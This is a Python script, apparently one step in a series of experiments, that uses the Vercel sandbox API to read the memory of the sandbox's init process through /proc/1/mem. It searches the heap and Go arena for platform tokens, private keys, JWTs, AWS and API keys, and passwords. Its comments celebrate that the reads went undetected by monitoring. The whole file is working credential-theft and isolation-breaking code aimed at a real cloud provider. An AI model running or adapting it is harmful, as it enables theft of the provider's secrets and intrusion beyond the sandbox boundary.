# 实验J188: sandbox-init 进程内存 dump + 凭据搜索
# j187: /proc/1/mem 完全可读(未触发监控)! heap 34MB + Go arena ~128MB
# 本步: 渐进式dump: heap(34MB) -> arena(64MB) 搜 vcp_/私钥/JWT/令牌
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def bashfile(sid, cmd, label, n=10000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "bash", "args": ["-c", cmd], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj188"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c)
if c != 200:
    print(r[:400])
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

# PA: heap 扫描 (00e9e000-02ee2000 34MB)
PA = r'''
import os
out = open("/tmp/d188a.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
p("start")
fd = os.open("/proc/1/mem", os.O_RDONLY)
pats = [b"vcp_", b"BEGIN PRIVATE KEY", b"BEGIN RSA PRIVATE KEY", b"-----BEGIN",
        b"eyJhbGci", b"eyJ0eXAi", b"sk-", b"AKIA", b"x-vercel-", b"Authorization",
        b"WVN8gckg", b"ed25519", b"private", b"secret", b"token", b"password",
        b"api.vercel", b"vercel.com", b"control", b"signature"]
# heap: 00e9e000-02ee2000
H_START = 0x00e9e000
H_END = 0x02ee2000
total = 0
pos = H_START
while pos < H_END:
    try:
        os.lseek(fd, pos, 0)
        d = os.read(fd, 8192)
    except Exception:
        break
    if not d:
        break
    total += len(d)
    for pat in pats:
        idx = d.find(pat)
        if idx >= 0:
            ctx = d[max(0, idx - 30):idx + 120]
            p("HIT", pat.decode(), hex(pos + idx),
              ctx.replace(b"\x00", b".").replace(b"\n", b" ")[:160])
    pos += len(d)
p("heap_scanned", total)
os.close(fd)
p("done")
out.close()
'''

# PB: Go arena 扫描 (7f7fb0120000-7f7fb2400000 前64MB)
PB = r'''
import os
out = open("/tmp/d188b.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
p("start")
fd = os.open("/proc/1/mem", os.O_RDONLY)
pats = [b"vcp_", b"BEGIN PRIVATE KEY", b"BEGIN RSA PRIVATE KEY", b"-----BEGIN",
        b"eyJhbGci", b"eyJ0eXAi", b"sk-", b"AKIA", b"x-vercel-", b"Authorization",
        b"WVN8gckg", b"api.vercel", b"vercel.com", b"signature", b"nonce"]
A_START = 0x7f7fb0120000
A_LIMIT = 0x7f7fb2400000
total = 0
pos = A_START
while pos < A_LIMIT:
    try:
        os.lseek(fd, pos, 0)
        d = os.read(fd, 8192)
    except Exception:
        break
    if not d:
        break
    total += len(d)
    for pat in pats:
        idx = d.find(pat)
        if idx >= 0:
            ctx = d[max(0, idx - 30):idx + 120]
            p("HIT", pat.decode(), hex(pos + idx),
              ctx.replace(b"\x00", b".").replace(b"\n", b" ")[:160])
    pos += len(d)
    if total % (8 * 1024 * 1024) == 0:
        p("PROG", total)
        out.flush()
p("arena_scanned", total)
os.close(fd)
p("done")
out.close()
'''

steps = [
    ("heap-scan", "/tmp/d188a.txt", PA),
    ("arena-scan", "/tmp/d188b.txt", PB),
]
for label, marker, code in steps:
    st = run_cmd(sid, code, label, timeout=280)
    time.sleep(2)
    bashfile(sid, f"cat {marker}", f"marker[{label}]", 10000)
    if st == "DEAD":
        print(f"\n!!! DEATH after cmd[{label}]", flush=True)
        break

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
